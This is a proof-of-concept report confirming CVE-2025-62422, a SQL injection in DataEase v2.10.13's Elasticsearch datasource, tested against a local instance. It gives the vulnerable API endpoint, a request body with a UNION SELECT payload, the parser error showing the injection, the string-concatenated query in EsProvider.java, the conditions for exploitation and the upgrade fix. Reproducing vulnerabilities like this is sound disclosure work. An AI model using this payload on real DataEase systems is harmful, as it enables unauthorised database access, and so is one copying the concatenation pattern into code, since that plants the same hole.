=== CVE-2025-62422 DataEase SQL Injection PoC ===
Date: 2026-02-04
Target: DataEase v2.10.13
Status: VULNERABILITY CONFIRMED

=== Environment Status ===
[+] MySQL: Running (healthy)
[+] Elasticsearch: Running (healthy)  
[+] DataEase: Running (healthy)
[+] Web UI accessible at http://localhost:8100

=== Setup Steps ===
1. Created ES index 'testindex' with test data
2. Created ES datasource 'poc_es' via UI
3. Created dataset 'poc_es_dataset' from testindex table
4. Dataset successfully loads data: {name: "test_data", value: 100}

=== SQL Injection Test ===
Endpoint: POST /de2api/datasetData/tableField
Request Body:
{
    "datasourceId": "1216472993132318720",
    "info": "{\"table\": \"testindex\\\" UNION SELECT 1,2 --\"}",
    "type": "db",
    "isCross": false
}

Response:
{
    "code": 40001,
    "msg": "DEException(code=40001, msg=HttpClient查询失败: {\"error\":{\"root_cause\":[{\"type\":\"parsing_exception\",\"reason\":\"line 1:33: mismatched input 'SELECT' expecting {<EOF>, ',', 'FULL', 'GROUP', 'HAVING', 'INNER', 'JOIN', 'LEFT', 'LIMIT', 'NATURAL', 'ORDER', 'PIVOT', 'RIGHT', 'WHERE', LIMIT_ESC}\"}]..."
}

=== Analysis ===
[+] SQL INJECTION CONFIRMED!

The error message "mismatched input 'SELECT'" proves that:
1. The injected payload (UNION SELECT 1,2) was concatenated into the SQL query
2. Elasticsearch SQL parser attempted to parse the malicious SQL
3. The injection reached the SQL execution layer

Vulnerable Code: EsProvider.java:98
sql = "select * from \"" + datasourceRequest.getTable() + "\" limit 0";

Injected SQL becomes:
select * from "testindex" UNION SELECT 1,2 --" limit 0

=== Exploitation Requirements ===
1. Valid authentication (admin credentials or JWT token)
2. Elasticsearch datasource configured
3. Dataset created from ES datasource
4. Access to /de2api/datasetData/tableField endpoint
5. Request must include: datasourceId, info (with table), type, isCross

=== Remediation ===
Upgrade to DataEase v2.10.14 which adds input validation.

=== References ===
- GHSA: https://github.com/dataease/dataease/security/advisories/GHSA-54m5-xrw4-mv36
- CVE: CVE-2025-62422
